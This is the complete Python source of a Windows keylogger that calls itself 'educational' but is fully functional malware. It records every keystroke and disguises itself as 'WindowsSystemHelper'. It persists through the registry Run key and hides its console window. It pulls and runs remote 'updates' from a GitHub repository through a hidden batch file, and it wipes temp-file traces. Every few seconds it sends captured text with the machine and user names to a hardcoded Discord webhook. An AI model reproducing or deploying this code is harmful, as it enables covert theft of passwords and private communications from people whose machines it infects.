import keyboard
import requests
import threading
import time
import os
import sys
import shutil
import winreg
import tempfile
import hashlib
import subprocess
from datetime import datetime

class EducationalKeylogger:
    def __init__(self, webhook_url):
        self.webhook_url = webhook_url
        self.current_word = ""
        self.buffer = []
        self.modifier_keys = {"alt", "ctrl", "shift", "windows"}
        self.key_mappings = {
            ("alt", "q"): "@",
            ("alt", "2"): "€",
            ("alt", "3"): "#",
            # Add more custom mappings as needed
        }
        self.modifier_pressed = set()
        self.is_running = False
        self.send_timer = None
        self.update_timer = None
        self.app_name = "WindowsSystemHelper"  # Disguised name for educational purposes
        
        # GitHub repository details for auto-update
        self.github_user = "umbx-ls14"
        self.github_repo = "upd"
        self.github_branch = "main"
        self.github_file_path = "log.py"  # Path to the file in the repository
        
        # Current version hash
        self.current_version = self.get_file_hash(sys.executable if getattr(sys, 'frozen', False) else __file__)

    def get_file_hash(self, file_path):
        """Calculate hash of the current file for version comparison"""
        try:
            with open(file_path, 'rb') as f:
                return hashlib.md5(f.read()).hexdigest()
        except:
            return "unknown"

    def check_for_updates(self):
        """Check GitHub for updates to the keylogger"""
        if not self.is_running:
            return
            
        try:
            # Get raw file URL from GitHub
            raw_url = f"https://raw.githubusercontent.com/{self.github_user}/{self.github_repo}/{self.github_branch}/{self.github_file_path}"
            
            # Get file metadata first to check size/hash without downloading full file
            response = requests.head(raw_url, timeout=10)
            
            if response.status_code == 200:
                # Get content length or ETag to check if file has changed
                remote_identifier = response.headers.get('Content-Length') or response.headers.get('ETag', '')
                
                # If we can't get a reliable identifier, download the file and check hash
                if not remote_identifier:
                    response = requests.get(raw_url, timeout=10)
                    if response.status_code == 200:
                        remote_hash = hashlib.md5(response.content).hexdigest()
                        if remote_hash != self.current_version:
                            self.update_keylogger(response.content)
                else:
                    # Check if our cached identifier differs from remote
                    stored_identifier = self.load_stored_identifier()
                    if remote_identifier != stored_identifier:
                        # Download full file and update
                        response = requests.get(raw_url, timeout=10)
                        if response.status_code == 200:
                            self.update_keylogger(response.content)
                            self.save_stored_identifier(remote_identifier)
                    
        except Exception as e:
            print(f"Update check error: {str(e)}")
        
        # Schedule next update check (every 30 minutes)
        self.update_timer = threading.Timer(1800.0, self.check_for_updates)
        self.update_timer.daemon = True
        self.update_timer.start()

    def load_stored_identifier(self):
        """Load stored file identifier from registry"""
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
            stored_id, _ = winreg.QueryValueEx(key, f"{self.app_name}_update_id")
            return stored_id
        except:
            return ""

    def save_stored_identifier(self, identifier):
        """Save file identifier to registry"""
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_WRITE
            )
            winreg.SetValueEx(key, f"{self.app_name}_update_id", 0, winreg.REG_SZ, identifier)
            winreg.CloseKey(key)
        except:
            pass

    def update_keylogger(self, new_content):
        """Update the keylogger with the new version"""
        try:
            # Get current executable path
            if getattr(sys, 'frozen', False):
                current_path = sys.executable
            else:
                current_path = os.path.abspath(__file__)
                
            # Create a temporary file for the update
            temp_dir = tempfile.gettempdir()
            update_file = os.path.join(temp_dir, f"{self.app_name}_update.exe")
            
            # Write new content to temporary file
            with open(update_file, 'wb') as f:
                f.write(new_content)
            
            # Create a batch file to handle the update process
            batch_content = f"""
@echo off
timeout /t 2 /nobreak > NUL
copy /Y "{update_file}" "{current_path}"
start "" "{current_path}"
del "{update_file}"
del "%~f0"
            """
            
            batch_file = os.path.join(temp_dir, f"{self.app_name}_updater.bat")
            with open(batch_file, 'w') as f:
                f.write(batch_content)
            
            # Execute the batch file and exit current process
            subprocess.Popen(batch_file, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            sys.exit()
            
        except Exception as e:
            print(f"Update error: {str(e)}")

    def clean_traces(self):
        """Clean traces of the keylogger (for educational purposes)"""
        try:
            # Delete temporary files
            temp_dir = tempfile.gettempdir()
            for pattern in [f"{self.app_name}*", "keylogger*"]:
                for file in os.listdir(temp_dir):
                    if pattern.replace("*", "") in file.lower():
                        try:
                            os.remove(os.path.join(temp_dir, file))
                        except:
                            pass
                            
            # Clear Windows event logs that might contain traces
            # (This requires admin privileges and is not recommended)
            # This is commented out as it's beyond educational purposes
            # subprocess.run("wevtutil cl System", shell=True)
            # subprocess.run("wevtutil cl Application", shell=True)
            
        except Exception as e:
            print(f"Clean traces error: {str(e)}")

    def install(self):
        """Set up the keylogger to run at startup"""
        if getattr(sys, 'frozen', False):
            # If running as compiled executable
            current_path = sys.executable
        else:
            # If running as script
            current_path = os.path.abspath(__file__)
            
        # Copy to a persistent location
        appdata_path = os.path.join(os.environ['APPDATA'], f"{self.app_name}.exe")
        
        try:
            # Check if already installed
            if os.path.abspath(current_path) != os.path.abspath(appdata_path):
                # Copy the file
                shutil.copy2(current_path, appdata_path)
                print(f"Installed to: {appdata_path}")
                
                # Add to registry for startup
                registry_key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                    0, winreg.KEY_WRITE
                )
                winreg.SetValueEx(registry_key, self.app_name, 0, winreg.REG_SZ, appdata_path)
                winreg.CloseKey(registry_key)
                print("Added to startup registry")
                
                # Run the installed version and exit this one
                os.startfile(appdata_path)
                sys.exit()
                
            return True
        except Exception as e:
            print(f"Installation error: {str(e)}")
            return False

    def is_already_running(self):
        """Check if another instance is already running"""
        import ctypes
        mutex = ctypes.windll.kernel32.CreateMutexA(None, False, b"EducationalKeyloggerMutex")
        return ctypes.windll.kernel32.GetLastError() == 183  # ERROR_ALREADY_EXISTS

    def start(self):
        """Start the keylogger"""
        # Check if already running
        if self.is_already_running():
            print("An instance is already running. Exiting.")
            sys.exit()
            
        self.is_running = True
        keyboard.hook(self.callback)
        self.schedule_send()
        
        # Start update checker
        self.check_for_updates()
        
        # For educational purposes, show a message
        print(f"Keylogger started. Press Ctrl+Esc to exit.")
        print(f"This is for educational purposes only.")
        
        # Hide console window (educational example)
        try:
            import win32console, win32gui
            window = win32console.GetConsoleWindow()
            win32gui.ShowWindow(window, 0)
        except:
            pass  # Continue if it fails
        
        # Add a way to stop the keylogger
        keyboard.wait("ctrl+esc")
        self.stop()

    def stop(self):
        """Stop the keylogger"""
        self.is_running = False
        keyboard.unhook_all()
        if self.send_timer:
            self.send_timer.cancel()
        if self.update_timer:
            self.update_timer.cancel()
        print("Keylogger stopped.")

    def callback(self, event):
        """Process keyboard events"""
        if not self.is_running:
            return

        if event.event_type == keyboard.KEY_DOWN:
            key_name = event.name.lower()
            
            # Handle modifier keys
            if key_name in self.modifier_keys:
                self.modifier_pressed.add(key_name)
                return
                
            # Check for custom key mappings
            for (mod, k), mapped_char in self.key_mappings.items():
                if mod in self.modifier_pressed and key_name == k:
                    self.process_character(mapped_char)
                    return
            
            # Handle special keys
            if key_name == "space":
                self.complete_word()
                return
            elif key_name == "enter":
                self.complete_word()
                self.buffer.append("\n")
                return
            elif key_name in ["backspace", "delete"]:
                if self.current_word:
                    self.current_word = self.current_word[:-1]
                return
            elif len(key_name) > 1:  # Other special keys
                return
                
            # Normal character
            if "shift" in self.modifier_pressed:
                key_name = key_name.upper()
            
            self.process_character(key_name)
            
        elif event.event_type == keyboard.KEY_UP:
            key_name = event.name.lower()
            if key_name in self.modifier_keys:
                self.modifier_pressed.discard(key_name)

    def process_character(self, char):
        """Add character to the current word"""
        self.current_word += char

    def complete_word(self):
        """Complete the current word and add to buffer"""
        if self.current_word:
            self.buffer.append(self.current_word)
            self.current_word = ""
        self.buffer.append(" ")

    def schedule_send(self):
        """Schedule periodic sending of logged data"""
        if not self.is_running:
            return
            
        # Complete any pending word
        if self.current_word:
            tmp_word = self.current_word
            self.current_word = ""
            self.buffer.append(tmp_word)
            
        # Send data if buffer has content
        if self.buffer:
            self.send_data()
            
        # Schedule next send
        self.send_timer = threading.Timer(5.0, self.schedule_send)
        self.send_timer.daemon = True
        self.send_timer.start()

    def send_data(self):
        """Send logged data to Discord webhook"""
        if not self.buffer:
            return
            
        text = "".join(self.buffer)
        if not text.strip():
            self.buffer = []
            return
        
        # Add computer name and username for context
        computer_info = f"PC: {os.environ['COMPUTERNAME']} | User: {os.environ['USERNAME']} | Version: {self.current_version[:8]}"
            
        # Format specifically for Discord webhook
        data = {
            "content": f"**Keylogger Entry** ({datetime.now().strftime('%Y-%m-%d %H:%M:%S')})\n{computer_info}\n```\n{text}\n```"
        }
        
        try:
            headers = {
                "Content-Type": "application/json"
            }
            response = requests.post(self.webhook_url, json=data, headers=headers, timeout=5)
            if response.status_code == 204:  # Discord returns 204 No Content on success
                print(f"Data sent successfully to Discord")
            else:
                print(f"Failed to send data. Status code: {response.status_code}")
                if response.text:
                    print(f"Response: {response.text}")
        except Exception as e:
            print(f"Error sending data: {str(e)}")
            
        self.buffer = []

if __name__ == "__main__":
    # Discord webhook URL
    WEBHOOK_URL = "https://discordapp.com/api/webhooks/1349359087921664103/XJhUMzJj4coQWM455WsjC5jbpx3tVMcbkwyQhHysCGgIUDKB1KaPHQNIxJAoORzJuhOq"
    
    keylogger = EducationalKeylogger(WEBHOOK_URL)
    
    # Handle persistence (for educational purposes only)
    keylogger.install()
    
    # Start the keylogger
    keylogger.start()